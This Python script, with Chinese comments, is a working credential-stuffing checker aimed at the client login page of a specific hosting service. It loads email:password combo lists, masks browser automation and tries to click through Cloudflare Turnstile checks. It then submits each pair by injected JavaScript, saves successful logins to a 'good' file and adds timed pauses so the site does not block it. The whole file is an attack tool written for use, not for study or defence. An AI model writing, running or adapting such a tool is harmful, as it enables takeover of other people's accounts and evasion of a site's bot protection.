# -*- coding: utf-8 -*-
# 花云 CF + 批量登录 (高速版)
# 安装: pip install DrissionPage
# 运行前: taskkill /F /IM chrome.exe /T

import sys
import os
import time
import random

try:
    from DrissionPage import ChromiumPage, ChromiumOptions
except ImportError:
    print("[!] pip install DrissionPage")
    sys.exit(1)

# 配置
TARGET_BASE = "https://api-flowercloud.com"
TARGET_PAGE = TARGET_BASE + "/clientarea.php"
COMBO_FILE = "combo_f.txt"
GOOD_FILE = "good.txt"
BAD_FILE = "bad.txt"
MAX_CF_WAIT = 120
CHROME_PATH = None

def find_browser():
    paths = [
        r"C:\Program Files\Google\Chrome\Application\chrome.exe",
        r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
        r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
        r"C:\Program Files\Microsoft\Edge\Application\msedge.exe",
    ]
    for p in paths:
        if os.path.exists(p):
            return p
    return None

def page_is_ready(page):
    try:
        html = page.html if page.html else ""
        return len(html) > 10000
    except:
        return False

def try_click_turnstile(page):
    try:
        iframes = page.eles("tag:iframe")
        for iframe in iframes:
            src = iframe.attr("src") or ""
            if "challenges.cloudflare.com" in src or "turnstile" in src:
                try:
                    iframe.click()
                    return True
                except:
                    pass
    except:
        pass
    try:
        cf_div = page.ele("css:.cf-turnstile", timeout=1)
        if cf_div:
            cf_div.click()
            return True
    except:
        pass
    return False

def wait_page_ready(page, max_wait=MAX_CF_WAIT):
    start = time.time()
    while time.time() - start < max_wait:
        if page_is_ready(page):
            return True
        try_click_turnstile(page)
        elapsed = int(time.time() - start)
        if elapsed % 10 == 0 and elapsed > 0:
            print("    ... CF (" + str(elapsed) + "s)")
        time.sleep(2)
    return page_is_ready(page)

def do_login_fast(page, email, password):
    # 用JS直接填表单并提交，比模拟点击快得多
    # 构造JS：找到表单，填值，提交
    js_fill_and_submit = """
    var emailBox = document.querySelector('#inputEmail') || document.querySelector('input[name="username"]') || document.querySelector('input[type="email"]');
    var passBox = document.querySelector('#inputPassword') || document.querySelector('input[name="password"]') || document.querySelector('input[type="password"]');
    if(emailBox && passBox) {
        emailBox.value = arguments[0];
        passBox.value = arguments[1];
        // 触发input事件让框架识别
        emailBox.dispatchEvent(new Event('input', {bubbles:true}));
        passBox.dispatchEvent(new Event('input', {bubbles:true}));
        // 找表单提交
        var form = emailBox.closest('form');
        if(form) {
            form.submit();
            return 'submitted';
        }
        // 没表单就找按钮
        var btn = document.querySelector('input[type="submit"]') || document.querySelector('button[type="submit"]');
        if(btn) {
            btn.click();
            return 'clicked';
        }
        return 'no_form_no_btn';
    }
    return 'no_input';
    """
    try:
        result = page.run_js(js_fill_and_submit, email, password)
        return result
    except:
        return "js_error"

def main():
    print("")
    print("  =============================================")
    print("    花云 CF + 批量登录 (高速版)")
    print("  =============================================")
    print("")
    if not os.path.exists(COMBO_FILE):
        print("[!] no " + COMBO_FILE)
        sys.exit(1)
    f = open(COMBO_FILE, "r", encoding="utf-8")
    lines = [l.strip() for l in f.readlines() if ":" in l.strip()]
    f.close()
    if not lines:
        print("[!] combo empty")
        sys.exit(1)
    print("[+] " + str(len(lines)) + " accounts loaded")
    global CHROME_PATH
    if not CHROME_PATH:
        CHROME_PATH = find_browser()
    if not CHROME_PATH:
        print("[!] no browser found")
        sys.exit(1)
    print("[+] browser: " + CHROME_PATH)
    print("[*] starting browser...")
    co = ChromiumOptions()
    co.set_browser_path(CHROME_PATH)
    co.set_argument("--start-maximized")
    co.set_argument("--disable-blink-features=AutomationControlled")
    co.set_argument("--no-first-run")
    co.set_argument("--no-default-browser-check")
    try:
        page = ChromiumPage(co)
    except Exception as e:
        print("[!] " + str(e))
        print("[*] run: taskkill /F /IM chrome.exe /T")
        sys.exit(1)
    print("[+] browser OK")
    # 首次过CF
    print("[*] opening " + TARGET_PAGE)
    page.get(TARGET_PAGE)
    time.sleep(5)
    page_size = len(page.html) if page.html else 0
    print("[*] current page size: " + str(page_size) + " bytes")
    if not page_is_ready(page):
        print("[*] CF challenge detected, waiting...")
        passed = wait_page_ready(page)
        if not passed:
            print("[!] auto CF failed")
            print("[*] click turnstile in Chrome, then press Enter")
            input()
            time.sleep(5)
            if not page_is_ready(page):
                print("[!] still not ready")
                page.quit()
                sys.exit(1)
    page_size = len(page.html) if page.html else 0
    print("[+] CF passed! page size: " + str(page_size) + " bytes")
    print("")
    print("[+] starting batch login...")
    print("=" * 50)
    print("")
    good = 0
    bad = 0
    err = 0
    total = len(lines)
    for i, line in enumerate(lines):
        parts = line.split(":", 1)
        if len(parts) != 2:
            continue
        email = parts[0].strip()
        password = parts[1].strip()
        print("[" + str(i+1) + "/" + str(total) + "] " + email)
        # 确保在登录页
        current_url = page.url if page.url else ""
        if "incorrect" in current_url:
            # 上一个失败后停在了 incorrect 页面，回到登录页
            page.get(TARGET_PAGE)
            time.sleep(2)
            if not page_is_ready(page):
                wait_page_ready(page, 30)
        elif "logout" in current_url or ("clientarea" in current_url and "incorrect" not in current_url):
            # 检查是否还有登录表单
            has_form = page.run_js("return !!(document.querySelector('#inputEmail') || document.querySelector('input[name=\"username\"]'))")
            if not has_form:
                # 已登录状态，需要退出
                page.get(TARGET_BASE + "/logout.php")
                time.sleep(2)
                page.get(TARGET_PAGE)
                time.sleep(2)
                if not page_is_ready(page):
                    wait_page_ready(page, 30)
        # 用JS快速填表单并提交
        submit_result = do_login_fast(page, email, password)
        if submit_result == "no_input":
            print("    [!] no input found, reloading...")
            page.get(TARGET_PAGE)
            time.sleep(3)
            if not page_is_ready(page):
                wait_page_ready(page, 30)
            submit_result = do_login_fast(page, email, password)
            if submit_result == "no_input":
                print("    [!] still no input")
                err += 1
                print("    !!! ERR !!!")
                save_result(BAD_FILE, line)
                print("    [H:" + str(good) + " B:" + str(bad) + " E:" + str(err) + "]")
                print("")
                continue
        if submit_result == "js_error":
            err += 1
            print("    !!! ERR (js) !!!")
            save_result(BAD_FILE, line)
            print("    [H:" + str(good) + " B:" + str(bad) + " E:" + str(err) + "]")
            print("")
            continue
        # 等待跳转完成
        time.sleep(3)
        # 如果跳转后又碰到CF
        if not page_is_ready(page):
            wait_page_ready(page, 30)
            time.sleep(1)
        # 判断结果
        final_url = page.url if page.url else ""
        final_lower = final_url.lower()
        # 也看页面内容
        try:
            page_html = page.html.lower() if page.html else ""
        except:
            page_html = ""
        if "incorrect" in final_lower or "incorrect" in page_html:
            bad += 1
            print("    --- BAD ---")
            save_result(BAD_FILE, line)
        elif "logout.php" in page_html:
            good += 1
            print("    >>> HIT <<<")
            save_result(GOOD_FILE, line)
            # 退出登录
            page.get(TARGET_BASE + "/logout.php")
            time.sleep(2)
            page.get(TARGET_PAGE)
            time.sleep(2)
            if not page_is_ready(page):
                wait_page_ready(page, 30)
        else:
            bad += 1
            print("    --- BAD ---")
            save_result(BAD_FILE, line)
        print("    [H:" + str(good) + " B:" + str(bad) + " E:" + str(err) + "]")
        print("")
        # 短暂延迟防止太快被封
        time.sleep(random.uniform(0.5, 1.5))
        # 每100个暂停
        if (i + 1) % 100 == 0:
            p = random.uniform(5, 10)
            print("[*] pause " + str(int(p)) + "s after 100...")
            time.sleep(p)
    print("=" * 50)
    print("  DONE!")
    print("  HIT:   " + str(good) + " -> " + GOOD_FILE)
    print("  BAD:   " + str(bad) + " -> " + BAD_FILE)
    print("  ERROR: " + str(err))
    print("  TOTAL: " + str(total))
    print("=" * 50)
    page.quit()

def save_result(filename, content):
    f = open(filename, "a", encoding="utf-8")
    f.write(content)
    f.write(os.linesep)
    f.close()

if __name__ == "__main__":
    main()
